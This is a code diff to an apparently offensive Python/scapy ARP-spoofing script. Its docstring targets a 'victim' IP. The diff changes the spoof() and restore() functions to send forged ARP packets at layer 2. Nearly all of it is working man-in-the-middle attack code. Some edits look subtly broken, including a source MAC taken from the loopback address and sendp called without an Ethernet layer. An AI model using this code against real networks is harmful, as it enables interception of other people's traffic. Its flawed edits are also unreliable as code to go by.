@@ -1,4 +1,4 @@
-from scapy.all import Ether, ARP, srp, send
+from scapy.all import Ether, ARP, srp, sendp
 import os, sys, time
 import requests
 import pyfiglet, termcolor
@@ -85,12 +85,11 @@ def spoof(target_ip, host_ip):
         target_ip (string): The ip's victim
         host_ip (string): Your ip address
     """
-    target_mac = get_mac(target_ip)
     
     # craft the arp 'is-at' operation packet, in other words: an ARP response
     # 'hwsrc' is not specified as by default it is our MAC address
-    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
-    send(arp_response, verbose=0)
+    arp_response = Ether() / ARP(op='who-has', hwsrc=get_mac("127.0.0.1"), pdst=target_ip, psrc=host_ip)
+    sendp(arp_response, verbose=0)
     print(".", end=" ", flush=True)
 
 def restore(target_ip, host_ip):
@@ -107,7 +106,7 @@ def restore(target_ip, host_ip):
     arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
 
     # we send each reply seven times for a good measure
-    send(arp_response, verbose=0, count=7)
+    sendp(arp_response, verbose=0, count=7)
 
 def show_help():
     """Show documentation and usage about this script
